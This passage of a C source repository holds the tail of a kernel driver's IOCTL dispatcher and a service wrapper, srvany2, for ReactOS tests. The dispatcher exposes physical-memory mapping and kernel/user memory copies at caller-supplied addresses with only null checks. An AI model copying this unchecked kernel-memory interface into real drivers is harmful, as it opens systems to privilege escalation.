                    (NAL_READREGISTER_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue.Uint32 =
                    NalReadRegister32(FunctionData->Address);
                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_WRITEREGISTER8_FUNCID:
            {
                NAL_WRITEREGISTER_FUNCS* FunctionData =
                    (NAL_WRITEREGISTER_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalWriteRegister8(FunctionData->Address,
                                      FunctionData->Value.Uint8);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_WRITEREGISTER16_FUNCID:
            {
                NAL_WRITEREGISTER_FUNCS* FunctionData =
                    (NAL_WRITEREGISTER_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalWriteRegister16(FunctionData->Address,
                                       FunctionData->Value.Uint16);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_WRITEREGISTER32_FUNCID:
            {
                NAL_WRITEREGISTER_FUNCS* FunctionData =
                    (NAL_WRITEREGISTER_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalWriteRegister32(FunctionData->Address,
                                       FunctionData->Value.Uint32);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_MMAPADDRESS_FUNCID:
            {
                NAL_MEMMAP_FUNCS* FunctionData =
                    (NAL_MEMMAP_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalMmapAddress((KVOID**)&FunctionData->VirtualAddress,
                                   FunctionData->PhysicalAddress,
                                   &FunctionData->Length);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_UNMAPADDRESS_FUNCID:
            {
                NAL_MEMMAP_FUNCS* FunctionData =
                    (NAL_MEMMAP_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalUnmapAddress(FunctionData->VirtualAddress,
                                    FunctionData->PhysicalAddress,
                                    FunctionData->Length);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_GETTIMESTAMP_FUNCID:
            {
                NAL_TIMESTAMP_FUNCS* FunctionData =
                    (NAL_TIMESTAMP_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalGetTimeStamp();

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_GETTIMESTAMPSPERMICROSECOND_FUNCID:
            {
                NAL_TIMESTAMP_FUNCS* FunctionData =
                    (NAL_TIMESTAMP_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalGetTimeStampsPerMicrosecond();

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_DELAYMICROSECONDS_FUNCID:
            {
                NAL_DELAY_FUNCS* FunctionData =
                    (NAL_DELAY_FUNCS*)(&(NalIoctl->InputBuffer));

                    NalDelayMicroseconds(FunctionData->Delay);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_DELAYMILLISECONDS_FUNCID:
            {
                NAL_DELAY_FUNCS* FunctionData =
                    (NAL_DELAY_FUNCS*)(&(NalIoctl->InputBuffer));

                    NalDelayMilliseconds(FunctionData->Delay);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_GETPHYSICALMEMORYADDRESS_FUNCID:
            {
                NAL_GETPHYSICALMEMORYADDRESS_FUNC* FunctionData =
                    (NAL_GETPHYSICALMEMORYADDRESS_FUNC*)(&(NalIoctl->InputBuffer));

                    FunctionData->ReturnValue =
                        NalGetPhysicalMemoryAddress(FunctionData->VirtualAddress);

                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_ALLOCATEMEMORYNONPAGED_FUNCID:
            {
                NAL_ALLOCATEMEMORYNONPAGED_FUNC* FunctionData =
                    (NAL_ALLOCATEMEMORYNONPAGED_FUNC*)(&(NalIoctl->InputBuffer));

                    FunctionData->ReturnValue =
                        _NalAllocateMemoryNonPaged(FunctionData->ByteCount,
                                                   FunctionData->Alignment,
                                                   &FunctionData->PhysicalAddress,
                                                   NULL,
                                                   0);

                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_FREEMEMORYNONPAGED_FUNCID:
            {
                NAL_FREEMEMORYNONPAGED_FUNC* FunctionData =
                    (NAL_FREEMEMORYNONPAGED_FUNC*)(&(NalIoctl->InputBuffer));

                    _NalFreeMemoryNonPaged(FunctionData->Address,
                                           NULL,
                                           0);

                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_KMEMSET_FUNCID:
            {
                NAL_KMEMSET_FUNC* FunctionData =
                    (NAL_KMEMSET_FUNC*)(&(NalIoctl->InputBuffer));

                if(FunctionData->Destination != NULL)
                {
                    NalKMemset(FunctionData->Destination,
                               FunctionData->Source,
                               FunctionData->Size);
                    NalStatus = NAL_SUCCESS;
                }
                else
                {
                    NalDebugPrint("NAL_KMEMSET_FUNCID: One of the buffers was NULL\n");
                    NalStatus = NAL_INVALID_PARAMETER;
                }
            }
            break;

         case NAL_KUMEMCPY_FUNCID:
            {
                NAL_KMEM_FUNCS* FunctionData =
                    (NAL_KMEM_FUNCS*)(&(NalIoctl->InputBuffer));

                if(FunctionData->Destination != NULL &&
                   FunctionData->Source != NULL)
                {
                    NalKtoUMemcpy(FunctionData->Destination,
                                  FunctionData->Source,
                                  FunctionData->Size);
                    NalStatus = NAL_SUCCESS;
                }
                else
                {
                    NalDebugPrint("NAL_KUMEMCPY_FUNCID: One of the buffers was NULL\n");
                    NalStatus = NAL_INVALID_PARAMETER;
                }
            }
            break;

         case NAL_KKMEMCPY_FUNCID:
            {
                NAL_KMEM_FUNCS* FunctionData =
                    (NAL_KMEM_FUNCS*)(&(NalIoctl->InputBuffer));

                if(FunctionData->Destination != NULL &&
                   FunctionData->Source != NULL)
                {
                    NalKtoKMemcpy(FunctionData->Destination,
                                  FunctionData->Source,
                                  FunctionData->Size);
                    NalStatus = NAL_SUCCESS;
                }
                else
                {
                    NalDebugPrint("NAL_KKMEMCPY_FUNCID: One of the buffers was NULL\n");
                    NalStatus = NAL_INVALID_PARAMETER;
                }
            }
            break;

         case NAL_UKMEMCPY_FUNCID:
            {
                NAL_KMEM_FUNCS* FunctionData =
                    (NAL_KMEM_FUNCS*)(&(NalIoctl->InputBuffer));

                NalUtoKMemcpy(FunctionData->Destination,
                              FunctionData->Source,
                              FunctionData->Size);

                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_ATOMICINCREMENT32_FUNCID:
            {
                NAL_ATOMIC_FUNCS* FunctionData =
                    (NAL_ATOMIC_FUNCS*)(&(NalIoctl->InputBuffer));

                FunctionData->ReturnValue =
                    NalAtomicIncrement32(FunctionData->Address);
                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_ATOMICDECREMENT32_FUNCID:
            {
                NAL_ATOMIC_FUNCS* FunctionData =
                    (NAL_ATOMIC_FUNCS*)(&(NalIoctl->InputBuffer));

                FunctionData->ReturnValue =
                    NalAtomicDecrement32(FunctionData->Address);
                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_ATOMICTESTSET32_FUNCID:
            {
                NAL_ATOMICTESTSET32_FUNC* FunctionData =
                    (NAL_ATOMICTESTSET32_FUNC*)(&(NalIoctl->InputBuffer));

                FunctionData->ReturnValue =
                    NalAtomicTestSet32(FunctionData->Address,
                                       FunctionData->Test,
                                       FunctionData->Set);
                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_ENABLE_DEBUG_PRINT_FUNCID:
            {
                NAL_ENABLE_DEBUG_PRINT_FUNC* FunctionData =
                    (NAL_ENABLE_DEBUG_PRINT_FUNC*)(&(NalIoctl->InputBuffer));

                if(FunctionData != NULL)
                {
                    NalEnableDebugPrint(FunctionData->Enable);
                    NalStatus = NAL_SUCCESS;
                }
                else
                {
                    NalDebugPrint("NAL_ENABLE_DEBUG_PRINT_FUNCID: FunctionData is NULL\n");
                    NalStatus = NAL_INVALID_PARAMETER;
                }
            }
            break;

        case NAL_DEBUGPRINT_FUNCID:
            {
                NAL_DEBUGPRINT_FUNC* FunctionData =
                    (NAL_DEBUGPRINT_FUNC*)(&(NalIoctl->InputBuffer));

                if(FunctionData != NULL)
                {
                    FunctionData->ReturnValue = NalDebugPrint(FunctionData->Message);
                    NalStatus = NAL_SUCCESS;
                }
                else
                {
                    NalDebugPrint("NAL_ENABLE_DEBUG_PRINT_FUNCID: FunctionData is NULL\n");
                    NalStatus = NAL_INVALID_PARAMETER;
                }
            }
            break;

         case NAL_ALLOCATEMEMORYNONPAGEDEX_FUNCID:
            {
                NAL_ALLOCATEMEMORYNONPAGED_FUNC* FunctionData =
                    (NAL_ALLOCATEMEMORYNONPAGED_FUNC*)(&(NalIoctl->InputBuffer));

                    FunctionData->ReturnValue =
                        _NalAllocateMemoryNonPagedEx(FunctionData->ByteCount,
                                                     FunctionData->Alignment,
                                                     FunctionData->ProcessId,
                                                     &FunctionData->PhysicalAddress,
                                                     NULL,
                                                     0);

                NalStatus = NAL_SUCCESS;
            }
            break;

         case NAL_FREEMEMORYNONPAGEDEX_FUNCID:
            {
                NAL_FREEMEMORYNONPAGED_FUNC* FunctionData =
                    (NAL_FREEMEMORYNONPAGED_FUNC*)(&(NalIoctl->InputBuffer));

                    _NalFreeMemoryNonPagedEx(FunctionData->Address,
                                             FunctionData->ProcessId,
                                             NULL,
                                             0);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_MMAPADDRESSEX_FUNCID:
            {
                NAL_MEMMAP_FUNCS* FunctionData =
                    (NAL_MEMMAP_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalMmapAddressEx((KVOID**)&FunctionData->VirtualAddress,
                                     FunctionData->PhysicalAddress,
                                     &FunctionData->Length,
                                     FunctionData->ProcessId);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_UNMAPADDRESSEX_FUNCID:
            {
                NAL_MEMMAP_FUNCS* FunctionData =
                    (NAL_MEMMAP_FUNCS*)(&(NalIoctl->InputBuffer));
                FunctionData->ReturnValue =
                    NalUnmapAddressEx(FunctionData->VirtualAddress,
                                      FunctionData->PhysicalAddress,
                                      FunctionData->Length,
                                      FunctionData->ProcessId);

                NalStatus = NAL_SUCCESS;
            }
            break;

        case NAL_GETPHYSICALMEMORYADDRESSEX_FUNCID:
            {
                NAL_GETPHYSICALMEMORYADDRESS_FUNC* FunctionData =
                    (NAL_GETPHYSICALMEMORYADDRESS_FUNC*)(&(NalIoctl->InputBuffer));

                    FunctionData->ReturnValue =
                        NalGetPhysicalMemoryAddressEx(FunctionData->VirtualAddress,
                                                      FunctionData->ProcessId);

                NalStatus = NAL_SUCCESS;
            }
            break;

        default:

            NalStatus = NAL_IOCTL_INVALID_FUNCTION_ID;
            break;
        }
    }
    return NalStatus;
}

NAL_STATUS
NalResolveHwBusIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    )
{
    NAL_STATUS NalStatus = NAL_INVALID_PARAMETER;

    if(NalIoctl != NULL)
    {

        switch(NalIoctl->FunctionId)
        {
            case NAL_READPCIDEVICECOUNT_FUNCID:
                {
                    NAL_READPCIDEVICECOUNT_FUNC* FunctionData =
                        (NAL_READPCIDEVICECOUNT_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalReadPciDeviceCount();

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_READPCIDEVICE_FUNCID:
                {
                    NAL_READPCIDEVICE_FUNC* FunctionData =
                        (NAL_READPCIDEVICE_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalReadPciDevice(FunctionData->PciLocations,
                                          &FunctionData->Count);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_FILLPCICONFIGSPEC_FUNCID:
                {
                    NAL_FILLPCICONFIGSPEC_FUNC* FunctionData =
                        (NAL_FILLPCICONFIGSPEC_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalFillPciConfigSpec(FunctionData->PciLocation,
                                              &FunctionData->PciDevice,
                                              FunctionData->DwordCount);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_OSREADPCICONFIG32_FUNCID:
                {
                    NAL_OSREADPCICONFIG32_FUNC* FunctionData =
                        (NAL_OSREADPCICONFIG32_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalOSReadPciConfig32(FunctionData->PciLocation,
                                              FunctionData->DwordNumber,
                                              &FunctionData->Value);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_OSWRITEPCICONFIG32_FUNCID:
                {
                    NAL_OSWRITEPCICONFIG32_FUNC* FunctionData =
                        (NAL_OSWRITEPCICONFIG32_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalOSWritePciConfig32(FunctionData->PciLocation,
                                               FunctionData->DwordNumber,
                                               FunctionData->Data);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_OSWRITEPCICONFIGVARIABLE_FUNCID:
                {
                    NAL_OSWRITEPCICONFIGVARIABLE_FUNC* FunctionData =
                        (NAL_OSWRITEPCICONFIGVARIABLE_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalOSWritePciConfigVariable(FunctionData->PciLocation,
                                                     FunctionData->DwordNumber,
                                                     FunctionData->ByteMask,
                                                     FunctionData->Data);

                    NalStatus = NAL_SUCCESS;
                }
                break;

            case NAL_ENABLEPCIDEVICE_FUNCID:
                {
                    NAL_ENABLEPCIDEVICE_FUNC* FunctionData =
                        (NAL_ENABLEPCIDEVICE_FUNC*)(&(NalIoctl->InputBuffer));
                    FunctionData->ReturnValue =
                        _NalEnablePciDevice(FunctionData->DeviceLocation);
                    NalStatus = NAL_SUCCESS;
                }
                break;

           default:

                NalStatus = NAL_IOCTL_INVALID_FUNCTION_ID;
                break;
        }
    }
    return NalStatus;
}

```

`source/ROS/srvany2/srvany2.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.168
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "srvany", "srvany2\srvany2.vcxproj", "{DA2D114B-786B-4999-8338-7D2A772EAE69}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x86 = Debug|x86
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{DA2D114B-786B-4999-8338-7D2A772EAE69}.Debug|x86.ActiveCfg = Debug|Win32
		{DA2D114B-786B-4999-8338-7D2A772EAE69}.Debug|x86.Build.0 = Debug|Win32
		{DA2D114B-786B-4999-8338-7D2A772EAE69}.Release|x86.ActiveCfg = Release|Win32
		{DA2D114B-786B-4999-8338-7D2A772EAE69}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {9159E424-291B-45AC-B085-CD7D7837B77D}
	EndGlobalSection
EndGlobal

```

`source/ROS/srvany2/srvany2/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.00
*
*  DATE:        01 Dec 2018
*
*  SRVANY2 for ReactOS tests, based on srvany-ng by Anthony Birkett.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>
#include "minirtl/minirtl.h"
#include "minirtl/cmdline.h"

#define SVC_NAME TEXT("srvany2")
#define MAX_DATA_LENGTH 16384

SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = NULL;
PROCESS_INFORMATION   g_ProcessInformation;

/*
* ServiceWorkerThread
*
* Purpose:
*
* Worker thread for waiting payload process.
*
*/
DWORD WINAPI ServiceWorkerThread(
    _In_ LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    OutputDebugString(TEXT("ServiceWorkerThread"));

    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0)
    {
        if (WaitForSingleObject(g_ProcessInformation.hProcess, 0) == WAIT_OBJECT_0) {
            OutputDebugString(TEXT("Wait complete, setting stop event"));
            SetEvent(g_ServiceStopEvent);
        }
        Sleep(1000);
    }

    return ERROR_SUCCESS;
}

/*
* ServiceSetState
*
* Purpose:
*
* Updates the service control manager's status information for the calling service.
*
*/
VOID ServiceSetState(
    _In_ DWORD dwControlsAccepted,
    _In_ DWORD dwCurrentState,
    _In_ DWORD dwWin32ExitCode
)
{
    SERVICE_STATUS serviceStatus;

    OutputDebugString(TEXT("ServiceSetState"));

    RtlSecureZeroMemory(&serviceStatus, sizeof(SERVICE_STATUS));
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwControlsAccepted = dwControlsAccepted;
    serviceStatus.dwCurrentState = dwCurrentState;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
    serviceStatus.dwWaitHint = 0;
    serviceStatus.dwWin32ExitCode = dwWin32ExitCode;

    SetServiceStatus(g_StatusHandle, &serviceStatus);
}

/*
* ServiceCtrlHandler
*
* Purpose:
*
* Handler for service control codes.
*
*/
VOID WINAPI ServiceCtrlHandler(
    _In_ DWORD ControlCode
)
{
    OutputDebugString(TEXT("ServiceCtrlHandler"));

    switch (ControlCode)
    {
    case SERVICE_CONTROL_STOP:
        SetEvent(g_ServiceStopEvent);
        TerminateProcess(g_ProcessInformation.hProcess, 0);
        ServiceSetState(0, SERVICE_STOPPED, 0);
        break;

    case SERVICE_CONTROL_PAUSE:
        ServiceSetState(0, SERVICE_PAUSED, 0);
        break;

    case SERVICE_CONTROL_CONTINUE:
        ServiceSetState(0, SERVICE_RUNNING, 0);
        break;

    default:
        break;
    }
}

/*
* ServiceMain
*
* Purpose:
*
* Service initialization routine and payload.
*
*/
VOID WINAPI ServiceMain(
    _In_ DWORD  dwArgc,
    _In_ LPTSTR *lpszArgv
)
{
    HANDLE hHeap = GetProcessHeap();
    HANDLE hThread;

    TCHAR *pszApplication;
    TCHAR *pszCommandLine;
    TCHAR *pszEnvironment;
    TCHAR *pszCurrentDirectory;

    DWORD cch;

    HKEY hKey;

    DWORD dwType, cbData;

    DWORD dwFlags = CREATE_UNICODE_ENVIRONMENT;

    STARTUPINFO startupInfo;
    TCHAR szKey[MAX_PATH];

    UNREFERENCED_PARAMETER(dwArgc);
    UNREFERENCED_PARAMETER(lpszArgv);

    OutputDebugString(TEXT("ServiceMain"));

    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
    RtlSecureZeroMemory(&g_ProcessInformation, sizeof(g_ProcessInformation));

    //
    // Allocate CreateProcess buffers.
    //
    pszApplication = (TCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_DATA_LENGTH + 2);
    if (pszApplication == NULL) {
        OutputDebugString(TEXT("pszApplication not allocated - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }
    pszCommandLine = (TCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_DATA_LENGTH + 2);
    if (pszCommandLine == NULL) {
        OutputDebugString(TEXT("pszCommandLine not allocated - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }
    pszEnvironment = (TCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_DATA_LENGTH + 2);
    if (pszEnvironment == NULL) {
        OutputDebugString(TEXT("pszCurrentDirectory not allocated - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }
    pszCurrentDirectory = (TCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_DATA_LENGTH + 2);
    if (pszCurrentDirectory == NULL) {
        OutputDebugString(TEXT("pszCurrentDirectory not allocated - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }

    //
    // Control handler.
    //
    g_StatusHandle = RegisterServiceCtrlHandler(SVC_NAME, ServiceCtrlHandler);
    if (g_StatusHandle == NULL) {
        OutputDebugString(TEXT("RegisterServiceCtrlHandler failed - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }

    //
    // Service stop notification event.
    //
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        OutputDebugString(TEXT("CreateEvent failed - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }

    //
    // Open service parameters keys.
    //
    _strcpy(szKey, TEXT("SYSTEM\\CurrentControlSet\\Services\\srvany2\\Parameters\\"));

    if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, szKey, 0, KEY_READ, &hKey)) {
        OutputDebugString(TEXT("Parameters key open failed - critical"));
        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }

    //
    // Read ApplicationName.
    //
    cbData = MAX_DATA_LENGTH;
    if (ERROR_SUCCESS != RegQueryValueEx(hKey, TEXT("ApplicationName"),
        NULL, &dwType, (LPBYTE)pszApplication, &cbData))
    {
        OutputDebugString(TEXT("ApplicationName read failed - critical"));

        ServiceSetState(0, SERVICE_STOPPED, GetLastError());
        return;
    }

    //
    // Read CommandLine.
    //
    cbData = MAX_DATA_LENGTH;
    if (ERROR_SUCCESS != RegQueryValueEx(hKey, TEXT("CommandLine"),
        NULL, &dwType, (LPBYTE)pszCommandLine, &cbData))
    {
        OutputDebugString(TEXT("CommandLine not set or query error"));

        HeapFree(hHeap, 0, pszCommandLine);
        pszCommandLine = NULL;
    }


    //
    // Read Environment.
    //
    cbData = MAX_DATA_LENGTH;
    if (ERROR_SUCCESS != RegQueryValueEx(hKey, TEXT("Environment"),
        NULL, &dwType, (LPBYTE)pszEnvironment, &cbData))
    {
        OutputDebugString(TEXT("Environment not set or query error"));

        HeapFree(hHeap, 0, pszEnvironment);
        pszEnvironment = GetEnvironmentStrings();
    }

    //
    // Read CurrentDirectory.
    //
    cbData = MAX_DATA_LENGTH;
    if (ERROR_SUCCESS != RegQueryValueEx(hKey, TEXT("CurrentDirectory"),
        NULL, &dwType, (LPBYTE)pszCurrentDirectory, &cbData))
    {
        OutputDebugString(TEXT("CurrentDirectory not set or query error"));

        RtlSecureZeroMemory(pszCurrentDirectory, MAX_DATA_LENGTH);

        cch = GetCurrentDirectory(MAX_DATA_LENGTH, pszCurrentDirectory);
        if ((cch == 0) || (cch > MAX_DATA_LENGTH)) {
            HeapFree(hHeap, 0, pszCurrentDirectory);
            pszCurrentDirectory = NULL;
        }
    }

    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;

    if (CreateProcess(pszApplication,
        pszCommandLine,
        NULL,
        NULL,
        FALSE,
        dwFlags,
        pszEnvironment,
        pszCurrentDirectory,
        &startupInfo,
        &g_ProcessInformation))
    {
        OutputDebugString(TEXT("CreateProcess success"));

        ServiceSetState(SERVICE_ACCEPT_STOP, SERVICE_RUNNING, 0);

        hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
        if (hThread == NULL) {
            ServiceSetState(0, SERVICE_STOPPED, GetLastError());
            return;
        }
        WaitForSingleObject(hThread, INFINITE);
    }
    else {
        OutputDebugString(TEXT("CreateProcess failed"));
    }

    OutputDebugString(TEXT("Service shutdown"));

    CloseHandle(g_ServiceStopEvent);
    ServiceSetState(0, SERVICE_STOPPED, 0);
}

//#define APP

#ifdef APP

/*
* InstallService
*
* Purpose:
*
* Installs service, force removes previous if found.
*
*/
BOOL InstallService(
    _In_ LPCTSTR lpServiceName,
    _In_ LPCTSTR lpBinary
)
{
    BOOL bResult = FALSE;

    DWORD retryCount;

    SC_HANDLE hManager, hService = NULL, hExService;

    hManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CREATE_SERVICE);
    if (hManager) {

        retryCount = 0;

        while (1) {

            hService = CreateService(hManager,
                lpServiceName,
                lpServiceName,
                SERVICE_ALL_ACCESS,
                SERVICE_INTERACTIVE_PROCESS | SERVICE_WIN32_OWN_PROCESS,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                lpBinary,
                NULL,
                NULL,
                NULL,
                NULL,
                NULL);

            if (hService) {
                break;
            }
            else {
                OutputDebugString(TEXT("CreateService fail"));
            }

            if (GetLastError() == ERROR_SERVICE_EXISTS) {
                OutputDebugString(TEXT("GetLastError() == ERROR_SERVICE_EXISTS"));

                hExService = OpenService(hManager, lpServiceName, DELETE);
                if (hExService) {
                    OutputDebugString(TEXT("hExService"));

                    DeleteService(hExService);
                    CloseServiceHandle(hExService);
                    Sleep(1000);
                }

                if (++retryCount < 2)
                    continue;

            }
            break;
        }

        if (hService) {
            bResult = TRUE;
            OutputDebugString(TEXT("Service installed"));
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hManager);
    }
    return bResult;
}

/*
* SetParameter
*
* Purpose:
*
* Set parameter to the service parameters registry key.
*
*/
VOID SetParameter(
    _In_ HKEY hKey,
    _In_ LPCTSTR lpCommandLine,
    _In_ LPCTSTR lpParamName,
    _In_ DWORD ParamIndex
)
{
    ULONG paramLength, cbData;
    TCHAR szCommandLine[MAX_PATH * 4];

    if (GetCommandLineParam(lpCommandLine, ParamIndex,
        szCommandLine, MAX_PATH, &paramLength))
    {
        if (paramLength) {

            cbData = (_strlen(szCommandLine) + 1) * sizeof(TCHAR);

            RegSetValueEx(hKey,
                lpParamName,
                0,
                REG_SZ,
                (BYTE*)szCommandLine,
                cbData);

        }
    }
}

/*
* main
*
* Purpose:
*
* Installer application entry point.
*
*/
void main()
{
    TCHAR szKey[MAX_PATH];
    TCHAR szServiceExe[MAX_PATH * 2];
    DWORD cch;
    HKEY hKey;

    LPTSTR lpCommandLine = GetCommandLine();

    cch = GetCurrentDirectory(MAX_PATH, szServiceExe);
    if ((cch != 0) && (cch < MAX_PATH)) {

        _strcat(szServiceExe, TEXT("\\srvany2.exe"));

        if (InstallService(TEXT("srvany2"), szServiceExe)) {

            _strcpy(szKey, TEXT("SYSTEM\\CurrentControlSet\\Services\\srvany2\\Parameters\\"));

            if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_LOCAL_MACHINE, szKey, 0, NULL,
                REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL))
            {
                SetParameter(hKey, lpCommandLine, TEXT("ApplicationName"), 1);
                SetParameter(hKey, lpCommandLine, TEXT("CommandLine"), 2);
                SetParameter(hKey, lpCommandLine, TEXT("CurrentDirectory"), 3);
                RegCloseKey(hKey);
            }
            else {
                MessageBox(0, TEXT("Could not create parameters key"), NULL, 0);
            }
        }
        else {
            MessageBox(0, TEXT("Could not install srvany2 service"), NULL, 0);
        }
    }
    ExitProcess(0);
}

#else 

/*
* main
*
* Purpose:
*
* Service entry point.
*
*/
void main()
{
    DWORD returnCode = 0;

    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { SVC_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    OutputDebugString(TEXT("srvany2"));

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        OutputDebugString(TEXT("StartServiceCtrlDispatcher failed"));
        returnCode = GetLastError();
    }
    ExitProcess(returnCode);
}
#endif

```

`source/ROS/srvany2/srvany2/minirtl/_strcat.c`:

```c
#include "rtltypes.h"

char *_strcat_a(char *dest, const char *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

```

`source/ROS/srvany2/srvany2/minirtl/_strcpy.c`:

```c
#include "rtltypes.h"

char *_strcpy_a(char *dest, const char *src)
{
	char *p;

	if ( (dest==0) || (src==0) )
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src)
{
	wchar_t *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

```

`source/ROS/srvany2/srvany2/minirtl/_strlen.c`:

```c
#include "rtltypes.h"

size_t _strlen_a(const char *s)
{
	char *s0 = (char *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

